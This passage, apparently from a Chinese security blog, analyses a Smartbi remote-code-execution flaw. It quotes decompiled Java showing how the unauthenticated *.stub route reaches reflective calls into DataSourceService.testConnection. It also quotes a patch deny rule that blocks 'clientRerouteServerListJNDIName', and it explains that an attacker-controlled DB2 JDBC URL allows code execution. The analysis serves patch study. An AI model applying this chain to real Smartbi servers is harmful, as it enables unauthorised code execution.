style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#e6db74">"/vision/RMIServlet"</span>.<span style="color:#a6e22e">equals</span>(request.<span style="color:#a6e22e">getServletPath</span>())<span style="color:#f92672">&amp;&amp;</span><span style="color:#f92672">!</span>forceParse) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> RMIInfo info<span style="color:#f92672">=</span> getRMIInfoFromRequest(request);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (info<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> info;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> String className<span style="color:#f92672">=</span> request.<span style="color:#a6e22e">getParameter</span>(<span style="color:#e6db74">"className"</span>);</span></span><span style="display:flex;"><span> String methodName<span style="color:#f92672">=</span> request.<span style="color:#a6e22e">getParameter</span>(<span style="color:#e6db74">"methodName"</span>);</span></span><span style="display:flex;"><span> String params<span style="color:#f92672">=</span> request.<span style="color:#a6e22e">getParameter</span>(SimpleReportBO.<span style="color:#a6e22e">EL_PARAMS</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (StringUtil.<span style="color:#a6e22e">isNullOrEmpty</span>(className)<span style="color:#f92672">&amp;&amp;</span> StringUtil.<span style="color:#a6e22e">isNullOrEmpty</span>(methodName)<span style="color:#f92672">&amp;&amp;</span> StringUtil.<span style="color:#a6e22e">isNullOrEmpty</span>(params)<span style="color:#f92672">&amp;&amp;</span> request.<span style="color:#a6e22e">getContentType</span>()<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span><span style="color:#f92672">&amp;&amp;</span> request.<span style="color:#a6e22e">getContentType</span>().<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">"multipart/form-data;"</span>)) {</span></span><span style="display:flex;"><span> DiskFileItemFactory dfif<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> DiskFileItemFactory();</span></span><span style="display:flex;"><span> ServletFileUpload upload<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ServletFileUpload(dfif);</span></span><span style="display:flex;"><span> String encodeString<span style="color:#f92672">=</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span> List<span style="color:#f92672">&lt;</span>FileItem<span style="color:#f92672">></span> fileItems<span style="color:#f92672">=</span> upload.<span style="color:#a6e22e">parseRequest</span>(request);</span></span><span style="display:flex;"><span> request.<span style="color:#a6e22e">setAttribute</span>(ATTR_KEY_UPLOAD_FILE_ITEMS, fileItems);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (FileItem fileItem : fileItems) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (fileItem.<span style="color:#a6e22e">isFormField</span>()) {</span></span><span style="display:flex;"><span> String itemName<span style="color:#f92672">=</span> fileItem.<span style="color:#a6e22e">getFieldName</span>();</span></span><span style="display:flex;"><span> String itemValue<span style="color:#f92672">=</span> fileItem.<span style="color:#a6e22e">getString</span>(<span style="color:#e6db74">"UTF-8"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#e6db74">"className"</span>.<span style="color:#a6e22e">equals</span>(itemName)) {</span></span><span style="display:flex;"><span> className<span style="color:#f92672">=</span> itemValue;</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#e6db74">"methodName"</span>.<span style="color:#a6e22e">equals</span>(itemName)) {</span></span><span style="display:flex;"><span> methodName<span style="color:#f92672">=</span> itemValue;</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (SimpleReportBO.<span style="color:#a6e22e">EL_PARAMS</span>.<span style="color:#a6e22e">equals</span>(itemName)) {</span></span><span style="display:flex;"><span> params<span style="color:#f92672">=</span> itemValue;</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#e6db74">"encode"</span>.<span style="color:#a6e22e">equals</span>(itemName)) {</span></span><span style="display:flex;"><span> encodeString<span style="color:#f92672">=</span> itemValue;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (FileUploadException<span style="color:#f92672">|</span> UnsupportedEncodingException e) {</span></span><span style="display:flex;"><span> LOG.<span style="color:#a6e22e">error</span>(e.<span style="color:#a6e22e">getMessage</span>(), e);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>StringUtil.<span style="color:#a6e22e">isNullOrEmpty</span>(encodeString)) {</span></span><span style="display:flex;"><span> String<span style="color:#f92672">[]</span> decode<span style="color:#f92672">=</span> (String<span style="color:#f92672">[]</span>) CodeEntry.<span style="color:#a6e22e">decode</span>(encodeString,<span style="color:#66d9ef">true</span>);</span></span><span style="display:flex;"><span> className<span style="color:#f92672">=</span> decode<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>;</span></span><span style="display:flex;"><span> methodName<span style="color:#f92672">=</span> decode<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>;</span></span><span style="display:flex;"><span> params<span style="color:#f92672">=</span> decode<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (className<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span><span style="color:#f92672">&amp;&amp;</span> methodName<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span> className<span style="color:#f92672">=</span> (String) request.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">"className"</span>);</span></span><span style="display:flex;"><span> methodName<span style="color:#f92672">=</span> (String) request.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">"methodName"</span>);</span></span><span style="display:flex;"><span> params<span style="color:#f92672">=</span> (String) request.<span style="color:#a6e22e">getAttribute</span>(SimpleReportBO.<span style="color:#a6e22e">EL_PARAMS</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> RMIInfo info2<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> RMIInfo();</span></span><span style="display:flex;"><span> info2.<span style="color:#a6e22e">setClassName</span>(className);</span></span><span style="display:flex;"><span> info2.<span style="color:#a6e22e">setMethodName</span>(methodName);</span></span><span style="display:flex;"><span> info2.<span style="color:#a6e22e">setParams</span>(params);</span></span><span style="display:flex;"><span> request.<span style="color:#a6e22e">setAttribute</span>(ATTR_KEY_RMI_INFO, info2);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> info2;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>而后调用processExecute方法，最终通过exceptionToNode方法通过反射调用了对应的方法</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String<span style="color:#a6e22e">processExecute</span>(HttpServletRequest request, String className, String methodName, String params) {</span></span><span style="display:flex;"><span> Map<span style="color:#f92672">&lt;</span>Integer, Integer<span style="color:#f92672">></span> map;</span></span><span style="display:flex;"><span> ClientService service<span style="color:#f92672">=</span> RMIModule.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">getService</span>(className);</span></span><span style="display:flex;"><span> ClientService operationFailLogService<span style="color:#f92672">=</span> RMIModule.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">getService</span>(<span style="color:#e6db74">"OperationLogService"</span>);</span></span><span style="display:flex;"><span> String resultStr<span style="color:#f92672">=</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> JSONArray jsonParams<span style="color:#f92672">=</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (Exception ce) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (Framework.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">getExceptionHandler</span>()<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> Framework.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">getExceptionHandler</span>().<span style="color:#a6e22e">processException</span>(ce);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (className<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span><span style="color:#f92672">&amp;&amp;</span> methodName<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span> ObjectNode resultNode<span style="color:#f92672">=</span> exceptionToNode(className, methodName, ce);</span></span><span style="display:flex;"><span> resultStr<span style="color:#f92672">=</span> resultNode.<span style="color:#a6e22e">toString</span>();</span></span><span style="display:flex;"><span> String failResult<span style="color:#f92672">=</span> resultNode.<span style="color:#a6e22e">has</span>(<span style="color:#e6db74">"detail"</span>)<span style="color:#f92672">?</span> resultNode.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"detail"</span>).<span style="color:#a6e22e">asText</span>((String)<span style="color:#66d9ef">null</span>) :<span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (StringUtil.<span style="color:#a6e22e">isNullOrEmpty</span>(failResult)) {</span></span><span style="display:flex;"><span> failResult<span style="color:#f92672">=</span> resultNode.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"result"</span>).<span style="color:#a6e22e">asText</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> List<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">></span> listParams<span style="color:#f92672">=</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (0<span style="color:#f92672">!=</span> 0) {</span></span><span style="display:flex;"><span> listParams<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ArrayList<span style="color:#f92672">&lt;></span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span> 0; i<span style="color:#f92672">&lt;</span> jsonParams.<span style="color:#a6e22e">length</span>(); i<span style="color:#f92672">++</span>) {</span></span><span style="display:flex;"><span> listParams.<span style="color:#a6e22e">add</span>(jsonParams.<span style="color:#a6e22e">get</span>(i));</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> Object<span style="color:#f92672">[]</span> objParams<span style="color:#f92672">=</span> {className, methodName, listParams, failResult};</span></span><span style="display:flex;"><span> operationFailLogService.<span style="color:#a6e22e">executeInternal</span>(<span style="color:#e6db74">"addOperationFailLog"</span>, objParams);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (Exception e) {</span></span><span style="display:flex;"><span> LOG.<span style="color:#a6e22e">error</span>(e.<span style="color:#a6e22e">getMessage</span>(), e);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object<span style="color:#a6e22e">executeInternal</span>(String methodName, Object<span style="color:#f92672">[]</span> objParams) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span> Method method<span style="color:#f92672">=</span> StringUtil.<span style="color:#a6e22e">isNullOrEmpty</span>(methodName)<span style="color:#f92672">?</span><span style="color:#66d9ef">null</span> :<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">methodList</span>.<span style="color:#a6e22e">get</span>(methodName);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (method<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> SmartbiException(CommonErrorCode.<span style="color:#a6e22e">METHOD_NAME_ERROR</span>).<span style="color:#a6e22e">setDetail</span>(StringUtil.<span style="color:#a6e22e">replaceHTML</span>(methodName));</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> Object result<span style="color:#f92672">=</span> method.<span style="color:#a6e22e">invoke</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">module</span>, objParams);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> result;</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (InvocationTargetException ex) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (ex.<span style="color:#a6e22e">getCause</span>()<span style="color:#66d9ef">instanceof</span> SmartbiException) {</span></span></code></pre></div><p>再来回顾一下补丁，补丁中说该漏洞是对钱一个漏洞的绕过，经过上面的分析可知*.stub接口无需身份验证，所以可以通过*.stub接口利用Smartbi内的反射调用到存在漏洞的类。</p><p>在补丁中有如下，通过全局搜索类名DataSourceService便可知道漏洞代码。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#e6db74">"PATCH_20221122"</span><span style="color:#960050;background-color:#1e0010">:</span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">"desc"</span>:<span style="color:#e6db74">"修复了 DB2 命令执行漏洞 (Patch.20221122 @2022-11-22)"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"desc_zh_TW"</span>:<span style="color:#e6db74">"修復了 DB2 命令執行漏洞 (Patch.20221122 @2022-11-22)"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"desc_en"</span>:<span style="color:#e6db74">"Fixed a DB2 command execution vulnerability. (Patch.20221122 @2022-11-22)"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"urls"</span>: [{</span></span><span style="display:flex;"><span><span style="color:#f92672">"url"</span>:<span style="color:#e6db74">"/vision/RMIServlet"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"rules"</span>: [{</span></span><span style="display:flex;"><span><span style="color:#f92672">"className"</span>:<span style="color:#e6db74">"DataSourceService"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"methodName"</span>:<span style="color:#e6db74">"testConnectionList"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"type"</span>:<span style="color:#e6db74">"RejectRMIParamsStringsPatchRule"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"strings"</span>: [<span style="color:#e6db74">"clientRerouteServerListJNDIName"</span>]</span></span><span style="display:flex;"><span> },{</span></span><span style="display:flex;"><span><span style="color:#f92672">"className"</span>:<span style="color:#e6db74">"DataSourceService"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"methodName"</span>:<span style="color:#e6db74">"testConnection"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"type"</span>:<span style="color:#e6db74">"RejectRMIParamsStringsPatchRule"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"strings"</span>: [<span style="color:#e6db74">"clientRerouteServerListJNDIName"</span>]</span></span><span style="display:flex;"><span> }]</span></span><span style="display:flex;"><span> }]</span></span><span style="display:flex;"><span> }<span style="color:#960050;background-color:#1e0010">,</span></span></span></code></pre></div><p>该代码中的参数均为可控，故可以通过控制JDBC url的方式执行恶意代码，此时可以通过DB2执行代码。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">testConnectionList</span>(List<span style="color:#f92672">&lt;</span>IDataSource<span style="color:#f92672">></span> list) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (IDataSource dataSource : list) {</span></span><span style="display:flex;"><span> MetaDataServiceImpl.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">testConnection</span>(dataSource);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">testConnection</span>(IDataSource dataSource) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> preIndex;</span></span><span style="display:flex;"><span> ISystemConfig systemConfig;</span></span><span style="display:flex;"><span> DataSource ds<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> DataSource();</span></span><span style="display:flex;"><span> String url<span style="color:#f92672">=</span> dataSource.<span style="color:#a6e22e">getUrl</span>();</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setId</span>(UUIDGenerator.<span style="color:#a6e22e">generate</span>());</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setName</span>(dataSource.<span style="color:#a6e22e">getName</span>());</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setAlias</span>(dataSource.<span style="color:#a6e22e">getAlias</span>());</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setDriver</span>(dataSource.<span style="color:#a6e22e">getDriver</span>());</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setDesc</span>(dataSource.<span style="color:#a6e22e">getDesc</span>());</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setDbCharset</span>(dataSource.<span style="color:#a6e22e">getDbCharset</span>());</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setUrl</span>(url);</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setUser</span>(dataSource.<span style="color:#a6e22e">getUser</span>());</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setDriverType</span>(dataSource.<span style="color:#a6e22e">getDriverType</span>());</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setMaxConnection</span>(dataSource.<span style="color:#a6e22e">getMaxConnection</span>());</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setValidationQuery</span>(dataSource.<span style="color:#a6e22e">getValidationQuery</span>());</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setPassword</span>(dataSource.<span style="color:#a6e22e">getPassword</span>());</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setTransactionIsolation</span>(dataSource.<span style="color:#a6e22e">getTransactionIsolation</span>());</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setValidationQueryMethod</span>(dataSource.<span style="color:#a6e22e">getValidationQueryMethod</span>());</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setAuthenticationType</span>(dataSource.<span style="color:#a6e22e">getAuthenticationType</span>());</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setExtendProp</span>(dataSource.<span style="color:#a6e22e">getExtendProp</span>());</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setDriverCatalog</span>(dataSource.<span style="color:#a6e22e">getDriverCatalog</span>());</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (dataSource.<span style="color:#a6e22e">getPassword</span>()<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span><span style="color:#f92672">&amp;&amp;</span><span style="color:#f92672">!</span>StringUtil.<span style="color:#a6e22e">isNullOrEmpty</span>(dataSource.<span style="color:#a6e22e">getId</span>())) {</span></span><span style="display:flex;"><span> DataSource dbDs<span style="color:#f92672">=</span> loadDataSource(dataSource.<span style="color:#a6e22e">getId</span>());</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setPassword</span>(dbDs.<span style="color:#a6e22e">getPassword</span>());</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (StringUtil.<span style="color:#a6e22e">isNullOrEmpty</span>(dataSource.<span style="color:#a6e22e">getId</span>())<span style="color:#f92672">&amp;&amp;</span> ds.<span style="color:#a6e22e">getDriverType</span>()<span style="color:#f92672">==</span> DBType.<span style="color:#a6e22e">HADOOP_HIVE</span><span style="color:#f92672">&amp;&amp;</span> (systemConfig<span style="color:#f92672">=</span> FreeQueryModule.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">getSystemConfigService</span>().<span style="color:#a6e22e">getSystemConfig</span>(<span style="color:#e6db74">"MPP_SSH_CONFIG"</span>))<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span> String longValue<span style="color:#f92672">=</span> systemConfig.<span style="color:#a6e22e">getLongValue</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (StringUtils.<span style="color:#a6e22e">isNotBlank</span>(longValue)) {</span></span><span style="display:flex;"><span> JSONObject jsonObject<span style="color:#f92672">=</span> JSONObject.<span style="color:#a6e22e">fromString</span>(longValue);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (jsonObject.<span style="color:#a6e22e">has</span>(SFTPConstants.<span style="color:#a6e22e">HIVE_PASSWORD</span>)) {</span></span><span style="display:flex;"><span> String pwd<span style="color:#f92672">=</span> jsonObject.<span style="color:#a6e22e">getString</span>(SFTPConstants.<span style="color:#a6e22e">HIVE_PASSWORD</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (StringUtils.<span style="color:#a6e22e">isNotBlank</span>(pwd)) {</span></span><span style="display:flex;"><span> ds.<span style="color:#a6e22e">setPassword</span>(pwd);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> Connection conn<span style="color:#f92672">=</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span> conn<span style="color:#f92672">=</span> ConnectionPool.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">getConnection</span>(ds);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (conn<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> SmartbiException(CommonErrorCode.<span style="color:#a6e22e">JDBC_DRIVER_ERROR</span>).<span style="color:#a6e22e">setDetail</span>(ds.<span style="color:#a6e22e">getDriver</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">":"</span><span style="color:#f92672">+</span> ds.<span style="color:#a6e22e">getUrl</span>());</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (DBType.<span style="color:#a6e22e">PRESTO</span><span style="color:#f92672">==</span> dataSource.<span style="color:#a6e22e">getDriverType</span>()) {</span></span><span style="display:flex;"><span> PreparedStatement stat<span style="color:#f92672">=</span> JdbcUtil.<span style="color:#a6e22e">prepareStatement</span>(conn,<span style="color:#e6db74">"SELECT 1"</span>, dataSource.<span style="color:#a6e22e">getDriverType</span>());</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span> PreparedStatementWarp.<span style="color:#a6e22e">executeQuery</span>(stat, DBSQLUtil.<span style="color:#a6e22e">createSQLLog</span>(ds.<span style="color:#a6e22e">getAlias</span>(), SmartbiXDataSetUtil.<span style="color:#a6e22e">OTHER</span>, FreeQueryModule.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">getStateModule</span>(),<span style="color:#e6db74">"SELECT 1"</span>));</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (Exception e) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (e<span style="color:#66d9ef">instanceof</span> SmartbiException) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span> ((SmartbiException) e);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> SmartbiException(FreeQueryErrorCode.<span style="color:#a6e22e">CONNECTION_POOL_NOT_INITIAL</span>, e).<span style="color:#a6e22e">setDetail</span>(StringUtil.<span style="color:#a6e22e">getLanguageValue</span>(<span style="color:#e6db74">"InvalidConnection"</span>));</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (DBType.<span style="color:#a6e22e">CLICK_HOUSE</span><span style="color:#f92672">==</span> dataSource.<span style="color:#a6e22e">getDriverType</span>()<span style="color:#f92672">&amp;&amp;</span> (preIndex<span style="color:#f92672">=</span> url.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">"clusterName="</span>))<span style="color:#f92672">></span><span style="color:#f92672">-</span>1) {</span></span><span style="display:flex;"><span> String clusterName<span style="color:#f92672">=</span> url.<span style="color:#a6e22e">substring</span>(preIndex<span style="color:#f92672">+</span><span style="color:#e6db74">"clusterName="</span>.<span style="color:#a6e22e">length</span>());</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> suffixIndex<span style="color:#f92672">=</span> clusterName.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">"&amp;"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (suffixIndex<span style="color:#f92672">></span><span style="color:#f92672">-</span>1) {</span></span><span style="display:flex;"><span> clusterName<span style="color:#f92672">=</span> clusterName.<span style="color:#a6e22e">substring</span>(0, suffixIndex);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>StringUtil.<span style="color:#a6e22e">isNullOrEmpty</span>(clusterName)) {</span></span><span style="display:flex;"><span> String validSql<span style="color:#f92672">=</span><span style="color:#e6db74">"drop table if exists t_testcluster on cluster "</span><span style="color:#f92672">+</span> clusterName;</span></span><span style="display:flex;"><span> PreparedStatement stat2<span style="color:#f92672">=</span> JdbcUtil.<span style="color:#a6e22e">prepareStatement</span>(conn, validSql, dataSource.<span style="color:#a6e22e">getDriverType</span>());</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span> PreparedStatementWarp.<span style="color:#a6e22e">executeQuery</span>(stat2, DBSQLUtil.<span style="color:#a6e22e">createSQLLog</span>(ds.<span style="color:#a6e22e">getAlias</span>(), SmartbiXDataSetUtil.<span style="color:#a6e22e">OTHER</span>, FreeQueryModule.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">getStateModule</span>(), validSql));</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (Exception e2) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (e2.<span style="color:#a6e22e">getLocalizedMessage</span>().<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">"Requested cluster '"</span><span style="color:#f92672">+</span> clusterName<span style="color:#f92672">+</span><span style="color:#e6db74">"' not found"</span>)<span style="color:#f92672">></span><span style="color:#f92672">-</span>1) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> SmartbiException(CommonErrorCode.<span style="color:#a6e22e">CLICK_HOUSE_CLUSTER_NOT_FOUND</span>, e2).<span style="color:#a6e22e">setDetail</span>(clusterName);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (e2<span style="color:#66d9ef">instanceof</span> SmartbiException) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span> ((SmartbiException) e2);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> SmartbiException(FreeQueryErrorCode.<span style="color:#a6e22e">CONNECTION_POOL_NOT_INITIAL</span>, e2).<span style="color:#a6e22e">setDetail</span>(StringUtil.<span style="color:#a6e22e">getLanguageValue</span>(<span style="color:#e6db74">"InvalidConnection"</span>));</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (Exception e3) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (e3<span style="color:#66d9ef">instanceof</span> SmartbiException) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span> ((SmartbiException) e3);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> String detail<span style="color:#f92672">=</span> SmartbiXDataSetUtil.<span style="color:#a6e22e">OTHER</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (e3<span style="color:#66d9ef">instanceof</span> ClassNotFoundException) {</span></span><span style="display:flex;"><span> detail<span style="color:#f92672">=</span> StringUtil.<span style="color:#a6e22e">getLanguageValue</span>(<span style="color:#e6db74">"DBDriverNoFound"</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> SmartbiException(FreeQueryErrorCode.<span style="color:#a6e22e">CONNECTION_POOL_NOT_INITIAL</span>, e3).<span style="color:#a6e22e">setDetail</span>(detail<span style="color:#f92672">+</span> e3.<span style="color:#a6e22e">getMessage</span>());</span></span><span style="display:flex;"><span> 